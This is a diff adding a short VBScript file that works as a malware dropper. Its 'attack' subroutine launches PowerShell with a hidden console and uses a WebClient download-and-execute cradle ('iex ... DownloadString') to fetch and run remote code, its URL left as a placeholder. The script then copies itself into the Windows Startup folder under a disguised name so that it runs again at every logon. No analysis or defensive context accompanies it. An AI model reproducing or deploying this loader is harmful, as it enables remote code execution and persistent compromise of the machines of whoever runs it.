@@ -1,0 +1,26 @@
+﻿Dim Capony
+Dim WshProcEnv
+Dim process_architecture
+ 
+Set Capony =  CreateObject("WScript.Shell")
+Set WshProcEnv = Capony.Environment("Process")
+ 
+process_architecture= WshProcEnv("PROCESSOR_ARCHITECTURE")
+ 
+If process_architecture = "x86" Then   
+    attack("Powershell")
+Else   
+    attack("C:\Windows\syswow64\Windowspowershell\v1.0\Powershell.exe")
+End If
+ 
+ 
+ 
+sub attack(S)
+ 
+Capony.Run S +" -noexit -C $cry = new-object Net.WebClient;iex $cry.DownloadString('123456')", CONSOLE_HIDE, CMD_WAIT
+ 
+ set startshe = wscript.createobject("wscript.shell")
+set sysOb = createobject("scripting.filesystemobject")
+startup = startshe.specialfolders ("startup") & "\ D" & "DD" & "D.vbs"
+sysOb.copyfile wscript.scriptfullname,startup ,true
+end sub
